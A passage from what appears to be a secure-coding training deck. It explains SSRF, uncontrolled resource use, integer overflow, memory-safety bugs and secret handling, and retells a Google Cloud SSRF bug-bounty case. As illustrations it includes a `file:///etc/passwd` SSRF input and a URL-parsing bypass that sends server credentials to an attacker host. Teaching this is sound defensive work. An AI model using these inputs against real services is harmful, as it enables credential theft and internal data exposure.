      <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      If an attacker can cause the application to send a request to a URL of their choice, many exploits can arise.
    </p>
  </div>
</div>

---

## Server-Side Request Forgery (SSRF)

If an application takes a URL from user input and sends a request to it, an attacker may use that facility to perform port scans, hide the real source of their traffic, bypass firewalls and access internal resources or even expose data with a URL like `file:///etc/passwd`.

One common non-obvious source of an SSRF vulnerability is the XML External Entities (XXE) vulnerability discussed earlier.

Approaches to defend against this vulnerability include firewalls within the application network, restriction of user input with a strict allow-list, disabling HTTP redirections and validating the type of content expected is returned (i.e. if an image was expected, ensure an image was received rather than returning raw request responses to users).

---

This [SSRF story](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/) from David Schütz provides an interesting example.

- A Google system which proxies requests between domains for URLs matching particular patterns is found.
- Confusion between different URL parsing specs allows a URL like https://attacker.example.com\@jobs.googleapis.com/ to pass the server's allow list, but make requests to the attacker's site.
- The Google system includes credentials in its request to attacker.example.com which can be reused for other purposes.
- The researcher ends up getting bug bounties three times over:
  - The initial attack described above.
  - An extra tweak to the URL which got through the first fix attempt.
  - The attack on an old version Google App Engine automatically keeps.

> https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Miscellaneous Vulnerabilities</h2>
  </div>
  <div class="section-start-right">
    <p>
      A few other key vulnerabilities which don’t fit into the OWASP Top 10 categories, but PCI DSS requirements or the SANS Top 25 highlight.
    </p>
  </div>
</div>

---

## Uncontrolled Resource Consumption

If an attacker is able to directly control the resource consumption of an application, they may easily be able to consume all available resources hence denying service to legitimate users.

This kind of vulnerability may arise if appropriate limits are not applied user’s input size, or to specific size values such as a count of results to return on a single page.

A similar flaw may result if the application does not correctly release resources after they have been used in all cases. For example, if a database connection is not returned to the pool in some error case, an attacker may be able to repeatedly trigger that error case, this consuming all connections.

> [CWE-400](https://cwe.mitre.org/data/definitions/400.html) and [CWE-772](https://cwe.mitre.org/data/definitions/772.html)

---

## Integer Overflow or Wraparound

Simple integer values within a program generally have a permitted range, and in many languages, incrementing a variable which contains the maximum value results in a large negative or zero value.

This fact becomes an issue when the behaviour is not handled by the program and user input in involved in the values being added. If the integer controls looping, the attacker may be able to create a denial of service and in cases where it it used in memory buffer offsets, it may create a situation where reads or writes occur outside the intended buffer.

> [CWE-190](https://cwe.mitre.org/data/definitions/190.html)

---

## Lower Level Code Specific Vulnerabilities

When working in lower-level languages like C and C++, a range of very-risky vulnerabilities related to memory management become very easy to create.

When allocating a memory buffer of a specific size, ensure that both reads and writes within the buffer cannot exceed the buffer, otherwise you’re reading/writing arbitrary other memory, a vulnerability which can be used to steal content of memory (e.g. encryption keys) or write code into memory which may subsequently be executed. ([CWE-119](https://cwe.mitre.org/data/definitions/119.html), [CWE-125](https://cwe.mitre.org/data/definitions/125.html), [CWE-787](https://cwe.mitre.org/data/definitions/787.html) and PCI DSS Requirement 6.5.2)

Using allocated memory after releasing it, similarly, risks data corruption and even arbitrary code execution, so care must be taken to ensure there is clarity around responsibility for releasing memory. ([CWE-416](https://cwe.mitre.org/data/definitions/416.html))

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Other Topics</h2>
  </div>
  <div class="section-start-right">
    <p>
      Other key security considerations.
    </p>
  </div>
</div>

---

## Secret Management

Secrets such as API keys, tokens or credentials need to be handled securely to ensure they are not leaked to a potential attacker.

- Application developers should not have access to secrets for production environments.
  - And to support that requirement, secrets for production environments should never be reused in lower pre-production/testing/development environments.
- Secrets should be stored in a central encrypted repository to support rotation.
- Never hard-code secrets in source code.

---

## Final Thought

If you see something you think is currently insecure, please don’t stay quiet!

If you’re mistaken, we’ll happily explain, and you get to learn something.
If you’re right, we’ll greatly appreciate the help in making our systems more secure!

---

# Questions

---

## License

Copyright © Instaclustr

This work is licensed under the Creative Commons Attribution-ShareAlike 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by-sa/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA.

---

## Credits

Some structure and examples are based on:

- The Open Web Application Security Project, under their Creative Commons Attribution Share-Alike 4.0 license. See https://owasp.org/Top10/A00-about-owasp/#copyright-and-license
- The MITRE Corporation’s Common Weakness Enumeration (CWE) site. See https://cwe.mitre.org/about/termsofuse.html


>  The MITRE Corporation ("MITRE") has copyrighted the CWE List, Top 25, CWSS, and CWRAF for the benefit of the community in order to ensure each remains a free and open standard, as well as to legally protect the ongoing use of it and any resulting content by government, vendors, and/or users. CWE is a trademark of MITRE. Please contact cwe@mitre.org if you require further clarification on this issue.
>  MITRE hereby grants you a non-exclusive, royalty-free license to use CWE for research, development, and commercial purposes. Any copy you make for such purposes is authorized on the condition that you reproduce MITRE’s copyright designation and this license in any such copy.